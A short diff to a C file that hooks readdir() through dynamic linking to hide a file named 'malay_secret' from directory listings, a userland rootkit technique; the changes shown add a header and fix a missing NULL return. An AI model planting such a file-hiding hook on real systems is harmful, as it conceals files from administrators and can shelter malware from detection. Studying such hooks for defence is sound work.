@@ -2,6 +2,7 @@
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h> 
+#include <stdio.h>
 
 const char *hidden_file = "malay_secret" ; 
 
@@ -29,7 +30,7 @@ struct dirent* readdir(DIR *dirp) {
     struct dirent *entry  = original_readdir_function(dirp);
 
     if(entry == NULL )
-        return;
+        return NULL;
     
     
     if (strcmp(entry->d_name, hidden_file) == 0 ){
